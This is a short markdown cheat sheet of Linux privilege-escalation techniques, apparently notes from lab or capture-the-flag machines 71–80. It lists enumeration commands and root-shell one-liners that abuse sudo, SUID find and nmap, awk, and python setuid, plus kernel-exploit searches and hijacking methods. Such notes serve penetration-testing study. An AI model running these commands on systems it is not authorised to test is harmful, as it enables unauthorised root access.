## 🛡️ Privilege Escalation (Machines 71–80)

### Enumeration Techniques

```bash
sudo -l                                     # Check sudo privileges
find / -perm -4000 -type f 2>/dev/null      # Find SUID binaries
getcap -r / 2>/dev/null                     # Check Linux capabilities
ps aux | grep root                          # Check for processes running as root
env                                         # Check for unusual environment variables
```

### Common Exploitation Techniques

- **Sudo Misconfigurations**
  ```bash
  sudo <binary>                             # Exploit if binary allowed with NOPASSWD
  sudo awk 'BEGIN {system("/bin/sh")}'      # Example of awk abuse
  ```

- **SUID Abuse**
  ```bash
  /usr/bin/find . -exec /bin/sh \;          # If find is SUID
  /usr/bin/nmap --interactive                # If nmap is SUID
  ```

- **Capabilities Exploits**
  ```bash
  getcap -r / 2>/dev/null
  python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
  ```

- **Kernel Exploits**
  ```bash
  uname -a                                  # Get kernel version
  searchsploit linux kernel <version>       # Search for kernel exploits
  ```

### Observed Techniques Across Machines 71–80

- Abuse of `pip` allowed with sudo (e.g., `sudo pip install` → arbitrary code execution)
- Writable systemd service files for privilege escalation
- LD_PRELOAD or LD_LIBRARY_PATH hijacking
- Exploitable cron jobs with insecure paths
- `journalctl` and `less` misconfiguration allowing shell access
